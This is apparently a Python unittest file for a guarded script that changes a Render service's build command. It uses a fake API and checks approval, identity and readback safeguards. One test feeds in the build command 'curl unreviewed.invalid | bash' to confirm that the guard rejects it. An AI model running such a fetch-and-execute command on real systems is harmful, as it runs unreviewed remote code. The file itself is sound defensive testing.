"""Value-free Render build-setting tests. Never connect to Render or modify deployment."""
from copy import deepcopy
import unittest

from scripts import tiq72_update_isolated_render_build as update


def service(build=update.OLD_BUILD):
    return {
        "id": update.SERVICE,
        "ownerId": update.WORKSPACE,
        "name": update.NAME,
        "repo": update.REPO,
        "branch": "main",
        "rootDir": "",
        "type": "web_service",
        "autoDeployTrigger": "off",
        "serviceDetails": {
            "envSpecificDetails": {
                "buildCommand": build,
                "startCommand": update.START,
            },
        },
    }


class FakeRender:
    def __init__(self, state=None, *, ignore_patch=False):
        self.state = service() if state is None else deepcopy(state)
        self.calls = []
        self.ignore_patch = ignore_patch

    def __call__(self, method, token, payload=None):
        assert token == "inert_test_token_value"
        self.calls.append((method, payload))
        if method == "PATCH":
            assert payload == {
                "serviceDetails": {"buildCommand": update.NEW_BUILD}
            }
            if not self.ignore_patch:
                self.state["serviceDetails"]["envSpecificDetails"][
                    "buildCommand"
                ] = update.NEW_BUILD
        return deepcopy(self.state)


class IsolatedBuildRepairTests(unittest.TestCase):
    def test_review_does_not_mutate_or_deploy(self):
        api = FakeRender()
        result = update.reconcile_build(
            apply=False, request=api, token="inert_test_token_value")
        self.assertEqual(result, "reviewed_isolated_test_build_change_ready_not_applied")
        self.assertEqual(api.calls, [("GET", None)])

    def test_manual_approval_changes_only_build_command_with_readback(self):
        api = FakeRender()
        result = update.reconcile_build(
            apply=True, approval=update.APPROVAL,
            request=api, token="inert_test_token_value")
        self.assertEqual(result, "isolated_test_build_setting_updated_deploy_still_required")
        self.assertEqual([x[0] for x in api.calls], ["GET", "PATCH", "GET"])
        self.assertEqual(api.state["serviceDetails"]["envSpecificDetails"]["startCommand"],
                         update.START)
        self.assertEqual(api.state["autoDeployTrigger"], "off")

    def test_missing_approval_refuses_before_patch(self):
        api = FakeRender()
        with self.assertRaisesRegex(update.GuardDenied, "operator_review_required"):
            update.reconcile_build(
                apply=True, request=api, token="inert_test_token_value")
        self.assertEqual(api.calls, [("GET", None)])

    def test_refuses_wrong_workspaces_branches_and_hold_start(self):
        for section, name, replacement in [
            ("root", "ownerId", "tea-other"),
            ("root", "id", "srv-other"),
            ("root", "branch", "release/prod"),
            ("root", "autoDeployTrigger", "commit"),
            ("nested", "startCommand", "node payment-enabled.mjs"),
        ]:
            with self.subTest(section=section, name=name):
                state = service()
                if section == "root":
                    state[name] = replacement
                else:
                    state["serviceDetails"]["envSpecificDetails"][name] = replacement
                api = FakeRender(state)
                with self.assertRaises(update.GuardDenied):
                    update.reconcile_build(
                        apply=True, approval=update.APPROVAL,
                        request=api, token="inert_test_token_value")
                self.assertEqual(api.calls, [("GET", None)])

    def test_refuses_unknown_build_command(self):
        with self.assertRaisesRegex(update.GuardDenied, "unexpected_build_command"):
            update.assert_identity(service("curl unreviewed.invalid | bash"))

    def test_fails_if_render_does_not_apply_exact_change(self):
        api = FakeRender(ignore_patch=True)
        with self.assertRaisesRegex(update.GuardDenied, "render_build_readback_mismatch"):
            update.reconcile_build(
                apply=True, approval=update.APPROVAL,
                request=api, token="inert_test_token_value")
        self.assertEqual([x[0] for x in api.calls], ["GET", "PATCH", "GET"])

    def test_idempotent_if_build_already_installed(self):
        api = FakeRender(service(update.NEW_BUILD))
        result = update.reconcile_build(
            apply=True, approval="", request=api, token="inert_test_token_value")
        self.assertEqual(result, "existing_isolated_build_setting_already_updated")
        self.assertEqual(api.calls, [("GET", None)])


if __name__ == "__main__":
    unittest.main()
